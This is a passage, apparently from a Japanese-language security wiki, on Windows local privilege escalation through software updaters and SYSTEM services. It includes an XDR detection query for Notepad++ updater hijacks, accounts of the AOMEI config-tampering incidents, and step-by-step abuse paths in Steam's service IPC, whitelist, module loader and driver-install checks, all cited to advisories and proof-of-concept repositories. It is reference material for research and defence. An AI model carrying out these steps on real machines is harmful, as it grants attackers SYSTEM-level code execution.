| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

これらのパターンは、署名なしのマニフェストを受け入れる、またはインストーラーの署名者を固定しないあらゆる updater に当てはまります。network hijack + malicious installer + BYO-signed sideloading によって、「信頼できる」更新を装った remote code execution が可能になります。

### 通知設定を第2の更新トリガーとして利用する

updater は、別々のリモート設定を使って**コンテンツを配置し、その実行をトリガー**できます。これには設定またはそのレスポンスを制御する必要がありますが、各報告では、どのようにオリジンへのアクセスを得たかは特定されていません。AOMEI の事例では、`down_html.ini` がアーカイブ URL、バージョン（`thrid`）、MD5（`Val`）を指定しており、攻撃者はバージョンを引き上げ、URL と対応する checksum を合わせて変更しました。これは上記で説明した[メタデータの信頼境界の不備](#2-hijacking-the-update-channel-to-run-code-as-system)です。追加の実行経路は `Notifycfg.ini` で、抽出された `upgrade-now.html` をローカルの `file:///` URL 経由で WebView に読み込むよう `ABNotify.exe` に指示していました。このページは自動的に同じディレクトリにある実行ファイルへ移動し、WebView はそれをシステムシェルに渡しました。子プロセスは notifier の権限を継承しましたが、これ自体で SYSTEM に権限昇格するわけではありません。<sup>[[17]](#references)[[18]](#references)</sup>

Google は、35,000 個を超える繰り返しのダミーセクションを含む改ざん済み `Notifycfg.ini` も報告しています。これにより、このクライアントの通常のバージョンチェックを回避しました。この報告は、一般的な parser bypass が成立することを示してはいません。攻撃者は5〜10分の時間枠の後にリモートファイルを元に戻していたため、その時間枠内に polling したクライアントだけが変更された設定を受け取りました。この通知チャネルには、アーカイブを実行する必要のない別種の[WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion)も含まれていました。<sup>[[18]](#references)</sup>

---
## 共有メモリを使った特権サービス IPC の初期化

named-pipe の列挙だけで終わらせないでください。SYSTEM broker は、接続確立用にアクセス許可の緩い名前付き**file mapping**を公開し、要求元プロセスに anonymous pipe handle を複製して渡す場合があります。テストされた Steam の設計では、`Global\SteamClientService_SharedMemFile` と `Global\SteamClientService_SharedMemLock` がクライアント PID/event のハンドシェイクを調整し、サービスは2つの pipe handle を返します。その後、長さプレフィックス付きのリクエストは `RunInterface`（`0x01`）を使います。mapping の DACL は、あらゆる integrity level のクライアントを許可していました。`steamclient64.dll` 内部の `CSteamServiceWin32` オブジェクトは、実用的なクライアントとして利用できます。ビルド固有の global を解決し、vtable slot 0 の `Connect` を呼び出した後、ハンドシェイクを再実装する代わりに interface map を使います。IPC に到達できることは前提条件にすぎず、権限昇格が起きるかどうかは特権 handler の信頼判断によって決まります。 <sup>[[19]](#references)[[20]](#references)</sup>

### 署名済みマニフェストが古い実行ファイルの許可リストに展開される

`IClientInstallUtils::AddInstallScriptToWhiteList`（slot 21）は、署名済み VDF の `kvsignatures` を検証しますが、不変のファイル ID ではなく、**展開後の実行ファイルのパス名**を記録します。`%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe` のような署名済みの `Run Process` エントリがある場合、ユーザーが書き込み可能な `%INSTALLDIR%` を用意します。その展開後のパスに置き換え用実行ファイルを配置し、許可リストに登録されたパスを `Process 1` に指定する署名なし VDF で `RunInstallScript`（slot 22）を呼び出します。このエントリは署名済みスクリプトの実行後もサービスの再起動まで残ります。報告された実装では、SYSTEM で起動する前にファイルが再検証されません。配置するファイル名は、単に前提条件のカテゴリに合わせるのではなく、実際の署名済みエントリに合わせてください。 <sup>[[19]](#references)[[20]](#references)</sup>

### Module manager の子プロセスが直接ロード時の署名チェックを回避する

`IClientModuleManager::LoadModule`（slot 0）は、指定された ID がデータの CRC32 と一致すれば、モジュールのバイト列を受け入れます。`flags & 8` を指定した `CallFunctionAsync`（slot 3）は、Valve の署名を検証する直接の reflective-load 分岐ではなく、**子プロセス**の分岐を選択します。サービスは `legacycompat\servicecall_<CRC>.dll` を書き込み、インストールディレクトリから `legacycompat\steamservice.exe /runfunc ...` を起動します。そのディレクトリがユーザーによる書き込み可能なら、後者のパスに実行ファイルを配置し、CRC が一致する任意の使い捨てモジュールをロードして、bit 3 をセットした状態で async method を呼び出します。報告されたビルドでは、子実行ファイルとディスクに書き込まれた DLL は認証されていません。モジュール自体が動作する payload である必要はありません。SYSTEM として実行されるのは、置き換えた子実行ファイルです。 <sup>[[19]](#references)[[20]](#references)</sup>

### 特権ドライバーのインストール前に行われるカタログメンバーのチェック

ドライバーインストール broker では、カタログ検証が**インストーラーに渡された正確な INF**と紐付いているか確認してください。報告された `InstallVrLinkDongleDriver` 経路では、`WinVerifyTrust` がカタログを検証し、`CryptCATAdminCalcHashFromFileHandle` は呼び出し元が指定したディレクトリ内に一致するファイルが*少なくとも1つ*あるかを確認します。しかし、サービスは、この INF が意図されたカタログメンバーであることを確認せずに、`netrtwlanuval.inf` に対して `pnputil /add-driver ... /install` を実行します。フラットなディレクトリも、アーキテクチャ別ディレクトリも受け入れられます。そのため、一致するファイルがディレクトリ内に1つでもあれば、特権インストーラーに渡される INF が異なっていても、弱いサービスチェックを通過できる可能性があります。これだけで Windows のドライバー署名ポリシーを回避できると考えてはいけません。インストールを成功させるには、置き換えたパッケージとホストのポリシーにも依存します。 <sup>[[19]](#references)[[20]](#references)</sup>

サービスは、`pnputil` が INF を開く前に検証用 handle を解放します。そのため、実行ファイルの更新ではなくドライバーインストールを sink とする[TOCTOU gap](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk)が生じます。oplock を使えば、チェック後からインストーラーがファイルを開くまでの間に置き換えを行えます。同じ IPC では、別個の同意条件のもとで[secure-desktop input forwarding](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring)も利用できます。 <sup>[[19]](#references)</sup>

## References
- [1] [Advisory – Netskope Client for Windows – 不正なサーバーを介したローカル権限昇格（CVE-2025-0309）](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4 の攻略](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent の書き込み可能ファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent の権限昇格](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家支援型攻撃者による Notepad++ サプライチェーンの悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – インフラ乗っ取りインシデントの更新情報](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows の CVE-2025-0309 修正を回避する](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage の権限昇格バグを発見する](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC から SYSTEM へ](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper のサプライチェーン侵害](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group と Mandiant – 一時的なサプライチェーン改ざんの調査](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Valve を攻略する](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – Turning the Valve PoCs](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
